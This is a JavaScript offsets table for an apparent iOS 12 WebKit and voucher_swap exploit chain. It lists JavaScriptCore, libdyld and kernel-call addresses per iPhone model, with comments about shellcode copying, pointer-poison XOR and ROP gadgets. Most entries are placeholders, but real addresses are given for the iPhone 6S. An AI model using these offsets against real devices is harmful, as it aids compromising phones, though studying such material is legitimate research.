var MISSING_OFFSET = 0x0;

var offsets = new Array();

offsets[12.01] = new Array();

offsets[12.11] = new Array();

offsets[12.01]["iPhone XR"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone XS"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone X"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone 8+"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone 8"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone 7+"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone 7"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone 6S+"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone 6S"] = {
	nativejitcode: 0x18887fb34, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: 0x1B1C95058, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: 0x180923bb8, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: 0x18096fa10, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: 0x1881CBF54, 			// From JavaScriptCore 
    g_gigacagebaseptrs: 0x1B80EC000, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: 0x1B80F01A0, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: 0x1B80F0190, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: 0x0, 						// Removed as of iOS 11.4 
    startfixedmempool: 0x1BA0610C0, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: 0x1BA0610C8, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: 0x1BA0610D0,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: 0x1b80f0018,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: 0x1b9fa9a18,				// To make our JITMemCpy work
    dlsym: 0x180923d64,								// For our shellcode + linkage
    longjmp: 0x180adc598,					
    callbacks: 0x1b80f01a8,
    modelio_popx8: 0x18cda4cd8,						// For our Return Oriented Programming chain
    coreaudio_popx2: 0x18438dfec,
    jscbase: 0x188174000,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: 0x188214890,					// From JavaScriptCore
    dyld_shared_cache: 0x180000000,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: 0x180A5F2D0,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: 0x180A5C0AC, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: 0x180A5BF64				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone SE"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone 6+"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};


offsets[12.01]["iPhone 6"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.01]["iPhone 5S"] ={
	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};

offsets[12.11]["iPhone 7"] ={
	nativejitcode: 0x1888bd210, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
    vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
    dlopen: 0x180921bd8, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
    confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
    disableprimitivegigacage: 0x188211ba0, 			// From JavaScriptCore 
    g_gigacagebaseptrs: 0x1b8c58000, 				// From JavaScriptCore 
  	g_jsarraybufferpoison: 0x1b8c5c1a0, 			// From JavaScriptCore (For XOR with leaked buffer)
  	g_jitcodepoison: 0x1b8c5c190, 					// From JavaScriptCore (For XOR with leaked code)
    g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
    startfixedmempool: 0x1bad790c0, 				// From JavaScriptCore (For copying shellcode)
    endfixedmempool: 0x1bad790c8, 					// From JavaScriptCore (For copying shellcode)
    jit_writeseperateheaps_func: 0x1bad790d0,		// From JavaScriptCore (For detecting below i8)
    usefastpermissions_jitcopy: 0x1b8c5c018,		// From JavaScriptCore (For detecting i8 and up)
    ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
    dlsym: MISSING_OFFSET,								// For our shellcode + linkage
    longjmp: MISSING_OFFSET,					
    callbacks: MISSING_OFFSET,
    modelio_popx8: MISSING_OFFSET,						// For our Return Oriented Programming chain
    coreaudio_popx2: MISSING_OFFSET,
    jscbase: MISSING_OFFSET,							// _TEXT segment of JavaScriptCore
    linkcode_gadget: MISSING_OFFSET,					// From JavaScriptCore
    dyld_shared_cache: MISSING_OFFSET,					// Just so we can parse any mach-o and find gadgets
    thread_swap_mach_voucher: MISSING_OFFSET,			// From libsystem_kernel.dylib (For voucher_swap)
    task_set_mach_voucher: MISSING_OFFSET, 			// From libsystem_kernel.dylib (For voucher_swap)
    task_get_mach_voucher: MISSING_OFFSET				// From libsystem_kernel.dylib (For voucher_swap)
};
